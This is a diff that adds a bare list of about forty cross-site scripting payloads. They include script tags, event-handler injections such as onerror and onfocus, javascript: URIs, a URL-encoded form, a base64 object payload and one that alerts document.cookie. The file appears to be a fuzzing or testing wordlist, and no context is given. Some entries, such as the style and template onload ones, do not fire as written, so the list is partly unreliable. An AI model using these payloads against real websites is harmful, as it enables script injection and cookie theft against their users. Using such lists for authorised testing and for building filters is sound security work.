@@ -1,0 +1,43 @@
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+javascript:alert(1)
+" onmouseover=alert(1) x="
+' onfocus=alert(1) autofocus '
+<svg/onload=alert(1)>
+" autofocus onfocus=alert(1) x="
+http://vulnerable.com/search?q=<script>alert(1)</script>
+" onload=alert(1) "
+'><iframe src=javascript:alert(1)>
+"><body onload=alert(1)>
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E (URL-encoded)
+'><audio src=x onerror=alert(1)>
+"><video><source onerror=alert(1)>
+'><details open ontoggle=alert(1)>
+"><marquee onstart=alert(1)>
+'><keygen autofocus onfocus=alert(1)>
+"><style onload=alert(1)>
+'><template onload=alert(1)>
+"><embed src=javascript:alert(1)>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<a href="javascript:alert(1)">Click</a>
+<div onmouseover=alert(1)>Hover</div>
+<input type="text" onfocus=alert(1) autofocus>
+<video><source onerror=alert(1)>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<script>alert(1)</script>
+<audio src=x onerror=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<keygen autofocus onfocus=alert(1)>
+<select onchange=alert(1)><option>1<option>2</select>
+<style onload=alert(1)>
+<script>alert(0)</script>
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+<embed src=javascript:alert(1)>
+<base href="javascript:alert(1)//">
+<template onload=alert(1)>
+<script>alert(xss)</script>
